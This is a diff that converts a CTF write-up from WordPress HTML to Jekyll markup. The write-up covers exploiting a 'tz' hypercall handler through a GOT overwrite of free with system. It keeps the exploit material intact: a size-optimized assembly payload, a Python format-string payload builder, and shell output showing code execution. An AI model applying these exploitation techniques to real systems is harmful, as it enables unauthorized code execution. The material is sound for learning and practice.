@@ -26,16 +26,13 @@ Therefore, we have an arbitrary-write-anywhere primitive. So, the question is &#
 
 We started looking at each of the hypercall handlers in **tz**.
 
-[<img class="aligncenter  wp-image-1949" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" alt="" width="508" height="425" />][1]
-
-&nbsp;
+{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" lightbox="braintree" %}
 
 Then, we stumbled upon hypercall #85.
 
-This function seemed like some sort of cleanup (we called it **delete_op** in our shellcode) function for an object used in **tz**.  
-(As I said previously, we didn&#8217;t do much of reversing on **tz** as we did for **uspace** and **kspace**)
+This function seemed like some sort of cleanup (we called it **delete_op** in our shellcode) function for an object used in **tz**. (As I said previously, we didn&#8217;t do much of reversing on **tz** as we did for **uspace** and **kspace**)
 
-[<img class="aligncenter  wp-image-1970" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/tz_0.png" alt="" width="424" height="565" />][2]
+{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/tz_0.png" lightbox="braintree" %}
 
 It seems like the first argument (v3) is a word that represents id of some sort, but the important thing is that we can control its value. v2 is an offset to the tz data structure, and the value at **tz_space + v2 (where v2 is 0)** is 0.
 
@@ -45,9 +42,11 @@ Since NX is enabled on **tz**, we decided to overwrite the GOT entry to execute 
   * Overwrite **free** (.got.plt in tz) with &system.
   * Overwrite contents in **v4 + 8** (aka, tz_space + 8) with a pointer to our command buffer.
 
-However, doing all of these comes with a price. The size limit (256 bytes) starts to become an issue here. We can either put another stager in the middle to allow us more space, or optimize our payload such that it fits under 256 bytes! We chose to do latter 😛
+However, doing all of these comes with a price. The size limit (256 bytes) starts to become an issue here. We can either put another stager in the middle to allow us more space, or optimize our payload such that it fits under 256 bytes! We chose to do latter :p
 
-<pre class="whitespace-after:1 lang:asm decode:true" title="shell.asm">[BITS 64]
+<p class="filename">shell.asm</p>
+{% highlight asm linenos %}
+[BITS 64]
 
 section .text
 global _start
@@ -140,20 +139,24 @@ dq 0x100000008         ; tz_space + 8
 xor_key:
 dq 0x7473656c72616863
 command:
-dq 0x900001000         ; we will put our command here</pre>
+dq 0x900001000         ; we will put our command here
+{% endhighlight %}
+<br />
 
 At first, we were over ~10 bytes, but once we have &#8220;optimized&#8221; a little bit, we finally got our payload to be 254 bytes!
 
 Note that we are not using the same shell.asm as before (our new payload is now called shell.asm). However, we can continue to use the same stage1.asm and the python script from **kspace** exploit. For convenience sake, it is also attached here.
 
-<pre class="whitespace-after:1 lang:python decode:true" title="pwn_tz.py">#!/usr/bin/python
+<p class="filename">pwn_tz.py</p>
+{% highlight python linenos %}
+#!/usr/bin/python
 import struct
 
 def p(v):
-    return struct.pack('&lt;Q', v)
+    return struct.pack('<Q', v)
 
 def u(v):
-    return struct.unpack('&lt;Q', v)[0]
+    return struct.unpack('<Q', v)[0]
 
 f = open('payload', 'wb')
 
@@ -168,19 +171,23 @@ f.write('create fmt\n'.ljust(0x400, '#'))
 payload = '%280x' + p(pop_pop_ret)
 f.write(payload.ljust(0x100, '\0'))
 
-f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))</pre>
+f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))
+{% endhighlight %}
+<br />
 
-<pre class="whitespace-after:1 lang:sh decode:true" title="Pwn!">$ nasm shell.asm -f bin -o shell.bin
+<p class="filename">Pwn!</p>
+{% highlight bash %}
+$ nasm shell.asm -f bin -o shell.bin
 $ ls -l shell.bin 
 -rw-rw-r-- 1 user user 254 Mar 4 21:58 shell.bin
 $ nasm stage1.asm -f bin -o stage1.bin
 $ python pwn_tz.py
 $ (cat ../tz/payload; cat -) | sudo ./tz
-bksh&gt; bksh&gt; bksh&gt;
+bksh> bksh> bksh>
 whoami
-tz</pre>
-
-&nbsp;
+tz
+{% endhighlight %}
+<br />
 
 We have abused the hypercall #92 (encrypt) to exploit both kspace and tz, but there may be another way to exploit kspace without going through the hypervisor.
 
@@ -190,9 +197,4 @@ Thank you for reading, and happy hacking!
 
 &nbsp;
 
-Write-up by Cai (Brian Pak) [https://www.bpak.org]
-
-&nbsp;
-
- [1]: https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png
- [2]: https://www.bpak.org/blog/wp-content/uploads/2015/03/tz_0.png
+Write-up by Cai (Brian Pak) [[https://www.bpak.org](http://www.bpak.org)]
